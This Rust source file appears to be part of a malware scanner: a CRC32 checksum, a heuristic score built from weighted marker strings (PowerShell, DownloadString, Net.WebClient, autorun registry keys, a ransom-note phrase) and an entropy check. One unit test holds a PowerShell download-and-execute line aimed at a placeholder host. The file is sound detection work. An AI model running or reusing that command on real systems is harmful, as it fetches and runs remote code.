use crate::entropy::shannon_entropy;

pub fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFF_FFFF;
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            let mask = (crc & 1).wrapping_neg();
            crc = (crc >> 1) ^ (0xEDB8_8320 & mask);
        }
    }
    !crc
}

fn contains_ci(haystack: &[u8], needle: &str) -> bool {
    let needle = needle.as_bytes();
    if needle.is_empty() || haystack.len() < needle.len() {
        return false;
    }
    haystack.windows(needle.len()).any(|w| {
        w.iter()
            .zip(needle.iter())
            .all(|(a, b)| a.to_ascii_lowercase() == b.to_ascii_lowercase())
    })
}

const MARKERS: &[(&str, f32)] = &[
    ("cmd.exe /c", 0.20),
    ("powershell", 0.20),
    ("frombase64string", 0.20),
    ("downloadstring", 0.25),
    ("net.webclient", 0.20),
    ("wscript.shell", 0.20),
    ("currentversion\\run", 0.20),
    ("your files have been encrypted", 0.60),
];

pub fn heuristic_score(data: &[u8]) -> f32 {
    let mut score = 0.0f32;
    for (marker, weight) in MARKERS {
        if contains_ci(data, marker) {
            score += weight;
        }
    }

    if data.len() > 4096 {
        let e = shannon_entropy(data);
        if e > 7.9 {
            score += 0.30;
        } else if e > 7.2 {
            score += 0.15;
        }
    }

    score.min(1.0)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn crc32_known_vector() {
        assert_eq!(crc32(b"123456789"), 0xCBF4_3926);
    }

    #[test]
    fn clean_text_scores_zero() {
        let data = b"hello world, this is a perfectly clean text file.";
        assert_eq!(heuristic_score(data), 0.0);
    }

    #[test]
    fn script_markers_increase_score() {
        let data = b"powershell -enc AAAA ; IEX (New-Object Net.WebClient).DownloadString('http://x')";
        assert!(heuristic_score(data) >= 0.4);
    }
}
